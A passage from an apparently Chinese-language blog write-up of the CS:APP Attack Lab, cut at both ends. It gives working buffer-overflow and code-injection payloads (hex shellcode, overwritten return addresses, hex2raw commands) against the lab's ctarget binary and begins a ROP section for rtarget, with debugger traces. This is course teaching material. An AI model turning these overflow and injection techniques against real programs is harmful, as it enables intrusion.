函数内部调用了 <code>getbuf</code> 函数，代码如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>getbuf</code> 函数会分配缓冲区大小，并调用 <code>Gets</code> 函数读取用户输入的字符串：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">getbuf</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处 <code>BUFFER_SIZE</code> 需要从汇编代码中获取。level 1 要求攻击者输入一段足够长的字符串，覆盖 <code>test</code> 栈帧中保存的返回地址，使得从 <code>getbuf</code> 返回之后不是继续执行调用 <code>getbuf</code> 的下一行，而是从 <code>touch1</code> 的第一行开始执行，<code>touch1</code> 的代码如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch1</span><span class="params">()</span> &#123;</span><br><span class="line">    vlevel = <span class="number">1</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch1!: You called touch1()\n&quot;</span>);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了确定字符串的长度和内容，需要分析一下 <code>ctarget</code> 的汇编代码，<code>objdump -d ctarget &gt; ctarget.asm</code> 可以将 <code>ctarget</code> 的汇编代码写入文件。其中 <code>touch1</code> 的代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  4017c4:c7 05 0e 2d 20 00 01 movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:00 00 00 </span><br><span class="line">  4017ce:bf c5 30 40 00       mov    $0x4030c5,%edi</span><br><span class="line">  4017d3:e8 e8 f4 ff ff       call   400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:bf 01 00 00 00       mov    $0x1,%edi</span><br><span class="line">  4017dd:e8 ab 04 00 00       call   401c8d &lt;validate&gt;</span><br><span class="line">  4017e2:bf 00 00 00 00       mov    $0x0,%edi</span><br><span class="line">  4017e7:e8 54 f6 ff ff       call   400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure><p>由此可知，攻击者需要将返回地址修改为 <code>0x4017c0</code> 才能完成 level 1。而 <code>getbuf</code> 的代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:48 83 ec 28          sub    $0x28,%rsp</span><br><span class="line">  4017ac:48 89 e7             mov    %rsp,%rdi</span><br><span class="line">  4017af:e8 8c 02 00 00       call   401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  4017b9:48 83 c4 28          add    $0x28,%rsp</span><br><span class="line">  4017bd:c3                   ret    </span><br><span class="line">  4017be:90                   nop</span><br><span class="line">  4017bf:90                   nop</span><br></pre></td></tr></table></figure><p>可以看到，栈指针减小了 0x28 也就是 40，说明缓冲区的大小为 40 个字节。一旦字符串的长度（包括结束符）大于 40，就会覆盖返回地址。字符串的前 40 个字符任意，第 41、42 和 43 个字符的十六进制值必须是 <code>C0</code>、<code>17</code> 和 <code>40</code>，才能将返回地址修改为 <code>0x4017c0</code>。修改前后的栈如下图所示：</p><p><img src="/2023/06/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l3-attacklab/2065884-20220514204300738-475480577.png" alt="img"></p><p>由于 <code>C0</code> 和 <code>17</code> 对应的字符打不出来，所以创建一个文件 <code>exp1.txt</code>，在里面写入 40 个 <code>30</code> 加上 <code>c0 17 40</code>，之后使用 <code>hex2raw</code> 将 <code>exp1.txt</code> 中的十六进制数转为字符串并作为 <code>ctarget</code> 的输入，结果如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jkup@R9000P ~/target1&gt; cat exp1.txt | ./hex2raw | ./rtarget -q</span><br><span class="line">Cookie: <span class="number">0x59b997fa</span></span><br><span class="line">Type <span class="built_in">string</span>:Touch1!: You called <span class="title function_">touch1</span><span class="params">()</span></span><br><span class="line">Valid solution <span class="keyword">for</span> level 1 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:1:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 C0 17 40</span><br></pre></td></tr></table></figure><blockquote><p>💡 GDB 调试技巧：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将输出重定向到文件foo中. 使用普通文件比命名管道（FIFO)更方便, 后者读取后不可再次读取</span></span><br><span class="line">jkup@R9000P ~/target1&gt; <span class="built_in">cat</span> exp1.txt | ./hex2raw &gt;foo</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb调试时, run时指定参数和输入</span></span><br><span class="line">jkup@R9000P ~/target1&gt; gdb ctarget</span><br><span class="line">pwndbg&gt; r -q &lt;foo</span><br></pre></td></tr></table></figure></blockquote><h2 id="Level-2">Level 2</h2><p>level 2 要求跳转到 <code>touch2</code> 函数，且执行 if 分支，<code>touch2</code> 的代码如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span> &#123;</span><br><span class="line">    vlevel = <span class="number">2</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说需要在跳转到 <code>touch2</code> 之前使用注入的指令，将 <code>%rdi</code> 的值修改为 <code>cookie</code> (本次实验的 <code>cookie</code> 为 <code>0x59b997fa</code>)。要想让输入的指令生效，需要将 <code>getbuf</code> 的返回地址修改为 <code>buf</code> 的起始地址，这样执行 <code>ret</code> 之后会将 <code>M[%rsp]</code> 送到 <code>%rip</code> 中，下次就不会从 Text 区取指令了，而是从 stack 里面取指令（此处就是缓冲区）。原理如下图所示：</p><p><img src="/2023/06/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l3-attacklab/2065884-20220514224135308-753344556.png" alt="img"></p><p>上图中的 <code>B</code> 代表缓冲区的起始地址，使用 pwndbg 可以拿到这个地址为 <code>0x5561dc78</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">*RSP  <span class="number">0x5561dc78</span> ◂— <span class="number">0</span></span><br><span class="line">*RIP  <span class="number">0x4017ac</span> (getbuf+<span class="number">4</span>) ◂— mov rdi, rsp</span><br><span class="line">──────────────────────────[ DISASM / x86<span class="number">-64</span> / <span class="built_in">set</span> emulate on ]───────────────────────────</span><br><span class="line">   <span class="number">0x4017a8</span> &lt;getbuf&gt;       sub    rsp, <span class="number">0x28</span></span><br><span class="line"> ► <span class="number">0x4017ac</span> &lt;getbuf+<span class="number">4</span>&gt;     mov    rdi, rsp</span><br><span class="line">   <span class="number">0x4017af</span> &lt;getbuf+<span class="number">7</span>&gt;     call   Gets                      &lt;Gets&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x4017b4</span> &lt;getbuf+<span class="number">12</span>&gt;    mov    eax, <span class="number">1</span></span><br><span class="line">   <span class="number">0x4017b9</span> &lt;getbuf+<span class="number">17</span>&gt;    add    rsp, <span class="number">0x28</span></span><br><span class="line">   <span class="number">0x4017bd</span> &lt;getbuf+<span class="number">21</span>&gt;    ret</span><br><span class="line"></span><br><span class="line">   <span class="number">0x4017be</span>                nop</span><br><span class="line">   <span class="number">0x4017bf</span>                nop</span><br><span class="line">   <span class="number">0x4017c0</span> &lt;touch1&gt;       sub    rsp, <span class="number">8</span></span><br><span class="line">   <span class="number">0x4017c4</span> &lt;touch1+<span class="number">4</span>&gt;     mov    dword ptr [rip + <span class="number">0x202d0e</span>], <span class="number">1</span> &lt;vlevel&gt;</span><br><span class="line">   <span class="number">0x4017ce</span> &lt;touch1+<span class="number">14</span>&gt;    mov    edi, <span class="number">0x4030c5</span></span><br></pre></td></tr></table></figure><p>为了实现 <code>%rdi</code> 的修改和 <code>touch2</code> 的跳转，可以使用如下的汇编代码实现（文件命名为 <code>inject_code2.s</code>），<code>ret</code> 指令可以将 <code>M[%rsp]</code> 的值（此处为 <code>touch2</code> 的地址 <code>0x4017ec</code>）送到 <code>%rip</code>，使得程序回到 Text 区的 <code>touch2</code> 函数处执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov $0x59b997fa, %edi</span><br><span class="line">retq</span><br></pre></td></tr></table></figure><blockquote><p>💡 Linux下使用AT&amp;T汇编格式，数字前加 <code>$</code>，寄存器文件前加 <code>%</code> 。<br>机器码 <code>30</code> 对应 <code>nop</code>，<code>c3</code> 对应 <code>ret</code>。</p></blockquote><p>使用 <code>gcc -c inject_code2.s</code> 得到目标文件 <code>inject_code2.o</code>，再用 <code>objdump -d inject_code2.o &gt; inject_code2.asm</code> 进行反汇编，得到包含二进制编码的汇编代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">jkup@R9000P ~/target1&gt; vim inject_code2.s</span><br><span class="line">jkup@R9000P ~/target1&gt; <span class="built_in">cat</span> inject_code2.s</span><br><span class="line">mov <span class="variable">$0x59b997fa</span>, %edi</span><br><span class="line">retq</span><br><span class="line">jkup@R9000P ~/target1&gt; gcc -c inject_code2.s</span><br><span class="line">jkup@R9000P ~/target1&gt; objdump -d inject_code2.o &gt; inject_code2.asm</span><br><span class="line">jkup@R9000P ~/target1&gt; <span class="built_in">cat</span> inject_code2.asm</span><br><span class="line"></span><br><span class="line">inject_code2.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   bf fa 97 b9 59          mov    <span class="variable">$0x59b997fa</span>,%edi</span><br><span class="line">   5:   c3                      retq</span><br></pre></td></tr></table></figure><p>编写<code>exp2.txt</code>，攻击如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">jkup@R9000P ~/target1&gt; vim exp2.txt</span><br><span class="line">jkup@R9000P ~/target1&gt; <span class="built_in">cat</span> exp2.txt</span><br><span class="line">bf fa 97 b9 59 /* mov <span class="variable">$0x59b997fa</span>, %edi */</span><br><span class="line">c3             /* ret */</span><br><span class="line">30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30</span><br><span class="line">78 dc 61 55 00 00 00 00 /* buf 的起始地址 */</span><br><span class="line">ec 17 40 00 /* touch2 的起始地址 */</span><br><span class="line">jkup@R9000P ~/target1&gt; <span class="built_in">cat</span> exp2.txt | ./hex2raw | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user <span class="built_in">id</span> bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:2:BF FA 97 B9 59 C3 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 78 DC 61 55 00 00 00 00 EC 17 40 00</span><br></pre></td></tr></table></figure><blockquote><p>💡 <strong>思考：这里明明设置了NX enabled 和 Canary，但是插入的代码依然可执行？</strong></p></blockquote><p>应该是 <code>stable_launch</code> 中进行了 <code>mmap</code> 的设置，产生了1个具有<code>rwxp</code>属性的新区 <code>[anon_55586]</code>，然后将 <code>rsp</code> 赋值到此区的地址，后面的栈就不是在<code>[stack]</code>区上（地址对应0x7fff…）操作，而是在具有可执行属性的<code>[anon_55586]</code> 上操作。支撑信息如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">   0x401f89 &lt;stable_launch+40&gt;     call   mmap@plt                      &lt;mmap@plt&gt;</span><br><span class="line"></span><br><span class="line"> ► 0x401f8e &lt;stable_launch+45&gt;     mov    rbx, rax</span><br><span class="line">   0x401f91 &lt;stable_launch+48&gt;     cmp    rax, 0x55586000</span><br><span class="line">   0x401f97 &lt;stable_launch+54&gt;     je     stable_launch+111                      &lt;stable_launch+111&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x401fd0 &lt;stable_launch+111&gt;    lea    rdx, [rax + 0xffff8]</span><br><span class="line">   0x401fd7 &lt;stable_launch+118&gt;    mov    qword ptr [rip + 0x203132], rdx &lt;stack_top&gt;</span><br><span class="line">   0x401fde &lt;stable_launch+125&gt;    mov    rax, rsp</span><br><span class="line">───────────────────────────────────────[ STACK ]───────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x7fffffffe580 —▸ 0x7fffffffe6a8 —▸ 0x7fffffffe933 ◂— <span class="string">&#x27;/home/jkup/target1/ctarget&#x27;</span></span><br><span class="line">01:0008│     0x7fffffffe588 —▸ 0x401377 (main+458) ◂— mov eax, 0</span><br><span class="line">02:0010│     0x7fffffffe590 ◂— 0x0</span><br><span class="line">03:0018│     0x7fffffffe598 —▸ 0x402ce0 (__libc_csu_init) ◂— mov qword ptr [rsp - 0x28], rbp</span><br><span class="line">04:0020│     0x7fffffffe5a0 —▸ 0x400e90 (_start) ◂— xor ebp, ebp</span><br><span class="line">05:0028│     0x7fffffffe5a8 ◂— 0x0</span><br><span class="line">06:0030│     0x7fffffffe5b0 ◂— 0x0</span><br><span class="line">07:0038│     0x7fffffffe5b8 —▸ 0x7ffff7e12d0a (__libc_start_main+234) ◂— mov edi, eax</span><br><span class="line">─────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────</span><br><span class="line"> ► 0         0x401f8e stable_launch+45</span><br><span class="line">   1         0x401377 main+458</span><br><span class="line">   2   0x7ffff7e12d0a __libc_start_main+234</span><br><span class="line">   3         0x400eb9 _start+41</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">          0x400000           0x404000 r-xp     4000      0 /home/jkup/target1/ctarget</span><br><span class="line">          0x603000           0x604000 r--p     1000   3000 /home/jkup/target1/ctarget</span><br><span class="line">          0x604000           0x605000 rw-p     1000   4000 /home/jkup/target1/ctarget</span><br><span class="line">          0x605000           0x627000 rw-p    22000      0 [heap]</span><br><span class="line">        0x55586000         0x55686000 rwxp   100000      0 [anon_55586]</span><br><span class="line">    0x7ffff7def000     0x7ffff7e11000 r--p    22000      0 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7e11000     0x7ffff7f6a000 r-xp   159000  22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7f6a000     0x7ffff7fb9000 r--p    4f000 17b000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7fb9000     0x7ffff7fbd000 r--p     4000 1c9000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7fbd000     0x7ffff7fbf000 rw-p     2000 1cd000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7fbf000     0x7ffff7fc5000 rw-p     6000      0 [anon_7ffff7fbf]</span><br><span class="line">    0x7ffff7fcc000     0x7ffff7fd0000 r--p     4000      0 [vvar]</span><br><span class="line">    0x7ffff7fd0000     0x7ffff7fd2000 r-xp     2000      0 [vdso]</span><br><span class="line">    0x7ffff7fd2000     0x7ffff7fd3000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7fd3000     0x7ffff7ff3000 r-xp    20000   1000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ff3000     0x7ffff7ffb000 r--p     8000  21000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  29000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  2a000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]</span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]</span><br></pre></td></tr></table></figure><p><strong>扩展：</strong> 另一种 <code>exp2.txt</code> 的写法如下。跳转到注入代码后，使用 <code>pushq</code> 指令将 <code>touch2</code> 的堆栈压入栈中，一样能实现跳转功能。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bf fa 97 b9 59 /* mov $0x59b997fa, %edi */</span><br><span class="line">68 ec 17 40 00 /* pushq $0x4017ec */</span><br><span class="line">c3             /* ret */</span><br><span class="line">30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30</span><br><span class="line">78 dc 61 55 00 00 00 00 /* buf 的起始地址 */</span><br></pre></td></tr></table></figure><h2 id="Level-3">Level 3</h2><p>level 3 要求跳转到 <code>touch3</code> 函数，并且执行 if 分支，代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span> *sval)</span> &#123;</span><br><span class="line">    vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span> &#123;</span><br><span class="line">    <span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">    <span class="type">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>touch3</code> 会使用 <code>hexmatch</code> 函数进行字符串匹配，此处 <code>cookie</code> 为 <code>0x59b997fa</code>，<code>sval</code> 是攻击者注入的 <code>cookie</code> 的起始地址。</p><p><code>hexmatch</code> 函数将 <code>cookie</code> 从十六进制数字转换成了字符串 <code>59b997fa</code>，然后写到随机地址<code>s</code> 处。攻击者首先要在某地址注入字符串 <code>59b997fa</code>，对应的十六进制为 <code>35 39 62 39 39 37 66 61</code>，然后可通过修改<code>rdi</code>寄存器为注入字符串地址来决定传入的字符指针<code>sval</code>。</p><p>由于跳转到 <code>touch3</code> 和 <code>hexmatch</code> 后，有许多的push操作会覆盖掉注入的<code>buf,</code>为了避免输入字符串被覆盖掉，可以将其放在输入字符串的最后，对应的内存地址为 <code>0x5561dc78 + 0x30 = 0x5561dca8</code>，其余部分和 level 2 相似。<code>exp3.txt</code> 内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 /* mov    $0x5561dca8,%rdi */</span><br><span class="line">68 fa 18 40 00       /* pushq  $0x4018fa */</span><br><span class="line">c3                   /* retq */</span><br><span class="line">30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30</span><br><span class="line">78 dc 61 55 00 00 00 00          /* buf 起始地址 */</span><br><span class="line">35 39 62 39 39 37 66 61 00       /* cookie: 0x59b997fa */</span><br></pre></td></tr></table></figure><blockquote><p>💡 注意压入 <code>touch3</code> 地址语句为<code>pushq  $0x4018fa</code>，不能少q喔。<br><code>pushq</code> 是压入64位数据，而 <code>push</code> 是压入32位数据。</p></blockquote><h1 id="ROP-攻击"><strong>ROP 攻击</strong></h1><p>代码注入攻击要求能够确定缓冲区的起始地址和缓冲区中注入的代码能够被执行，<strong>如果引入栈随机化技术并限制可执行代码区域为 Text 区，代码注入攻击就不好使了</strong>。<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">Writeup</a>提到 <code>rtarget</code> 使用到了2种技术：</p><ul><li>栈地址随机化（<strong>ASLR</strong>）</li><li>栈不可执行（<strong>DEP</strong>）</li></ul><p>虽然我们注入的代码不能被执行，但是 Text 区的代码还是可以被执行的。如果能把这些代码组合在一起，实现我们想要的功能，那么也能实现攻击目的。这时候<strong>缓冲区保存的就不是指令了，而是一条条 Text 区可以被执行的指令的地址，同时这些指令有个特点，就是后面会跟着 <code>ret</code> 指令，这样才能根据缓冲区中保存的指令地址接着取指</strong>。上述的攻击方式就被称为 ROP 攻击，示意图如下：</p><p><img src="/2023/06/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l3-attacklab/image-20230621151222771.png" alt></p><p>查看程序信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">&#x27;/home/jkup/target1/rtarget&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><h2 id="Level-2-2"><strong>Level 2</strong></h2><p>Level 2 要求使用 <code>ROP</code> 攻击跳转到 <code>touch2</code> 函数并执行 if 分支，并给出了下列要求：</p><ul><li>只能使用包含 <code>movq</code>、<code>popq</code>、<code>ret</code> 和 <code>nop</code> 的 gadget。</li><li>只能操作 <code>%rax</code> 到 <code>%rdi</code> 这前八个寄存器。</li><li>只能使用 <code>start_farm</code> 到 <code>mid_farm</code> 区间内的代码来构造 gadget。</li></ul><p>并且友情提示了只要两条 gadget 就能实现攻击。我们在代码注入攻击 level 2 中注入了 <code>mov $0x59b997fa, %edi</code> 指令来实现 <code>%rdi</code> 的赋值，但是 <code>start_farm</code> 到 <code>mid_farm</code> 区间内的代码没有包含 <code>0x59b997fa</code> 立即数，所以这个立即数应该由攻击者输入，放入栈中。接着我们可以使用下述指令实现 <code>%rdi</code> 的赋值：</p><figure 